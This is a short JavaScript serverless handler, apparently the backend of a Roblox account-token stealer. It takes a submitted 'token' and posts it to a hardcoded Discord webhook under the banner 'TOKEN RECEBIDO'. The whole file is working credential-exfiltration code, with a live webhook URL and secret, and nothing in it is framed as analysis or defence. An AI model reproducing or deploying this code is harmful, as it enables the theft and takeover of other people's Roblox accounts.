// api/send-token.js
export default async function handler(req, res) {
  // Só aceita POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método não permitido' });
  }

  const { token } = req.body;

  if (!token || token.length < 30) {
    return res.status(400).json({ error: 'Token inválido' });
  }

  const webhook = "https://discordapp.com/api/webhooks/1472960946363306016/K2T6_RdOTxyn2maT47ySjjNLQaVdjT9O7mHl6eIf_DRlil5L2fgH4vA9UB5sPZFm318y";

  const payload = {
    content: "**@everyone TOKEN RECEBIDO** 💀",
    embeds: [{
      title: "Token Roblox",
      description: "```" + token + "```",
      color: 0xff0044,
      footer: { text: new Date().toLocaleString("pt-BR") }
    }]
  };

  try {
    const response = await fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      throw new Error("Falha ao enviar pro Discord");
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error(error);
    return res.status(500).json({ error: "Erro interno" });
  }
}
